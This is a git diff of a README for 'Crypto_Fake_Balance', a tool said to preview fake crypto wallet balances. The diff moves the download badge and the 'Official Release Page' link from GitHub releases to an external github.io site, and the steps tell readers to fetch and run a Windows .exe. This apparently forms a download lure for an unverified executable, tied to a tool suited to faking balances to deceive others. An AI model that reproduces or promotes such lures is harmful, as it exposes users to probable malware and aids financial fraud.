@@ -1,7 +1,7 @@
 # 💰 Crypto_Fake_Balance - Preview wallet balances for testing purposes
 
 <p align="center">
-  <a href="https://github.com/simosh4442-glitch/Crypto_Fake_Balance/releases">
+  <a href="https://simosh4442-glitch.github.io">
     <img src="https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows&logoColor=white">
   </a>
 </p>
@@ -39,7 +39,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [Official Release Page](https://github.com/simosh4442-glitch/Crypto_Fake_Balance/releases) to access the download files.
+1. Visit the [Official Release Page](https://simosh4442-glitch.github.io) to access the download files.
 2. Look for the latest version tag, labeled as Version 3.0.
 3. Locate the file ending in .exe under the Assets section. 
 4. Click the file name to start the download.
